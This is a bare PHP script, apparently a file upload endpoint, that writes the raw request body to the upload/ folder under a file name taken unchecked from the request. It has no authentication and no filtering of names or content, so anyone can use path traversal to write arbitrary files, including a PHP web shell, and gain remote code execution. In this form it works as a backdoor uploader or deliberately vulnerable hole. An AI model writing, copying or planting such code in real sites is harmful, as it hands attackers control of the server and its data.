<?php
file_put_contents('upload/'.$_REQUEST['filename'], file_get_contents('php://input'));
?>
